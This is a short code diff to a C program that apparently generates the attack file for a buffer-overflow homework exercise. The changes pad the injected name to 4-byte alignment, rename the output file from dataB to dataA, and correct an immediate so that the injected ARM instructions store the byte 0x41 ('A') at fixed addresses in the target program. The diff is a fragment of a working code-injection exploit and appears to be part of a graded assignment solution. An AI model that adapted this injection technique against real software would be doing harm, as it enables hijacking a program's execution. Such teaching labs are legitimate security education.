@@ -24,9 +24,13 @@ int main(void) {
     }
     /* add nullbyte */
     pcInject[i++] = '\0';
+    /* ensure instructions are 4-byte aligned */
+    while (i % 4 != 0) {
+       pcInject[i++] = '\0';
+    }
     iNameLength = i;
 
-    psFile = fopen("dataB", "w");
+    psFile = fopen("dataA", "w");
     /* write name */
     fwrite(pcInject, sizeof(char), iNameLength, psFile);
     /* write instructions */
@@ -35,7 +39,7 @@ int main(void) {
     uiAdr = MiniAssembler_adr(0, 0x420044, 0x420058 + iNameLength);
     fwrite(&uiAdr, sizeof(unsigned int), 1, psFile);
     /* get "A" instr */
-    uiMov = MiniAssembler_mov(1, 41);
+    uiMov = MiniAssembler_mov(1, 0x41);
     fwrite(&uiMov, sizeof(unsigned int), 1, psFile);
     /* set "A" instr */
     uiStrb = MiniAssembler_strb(1, 0);
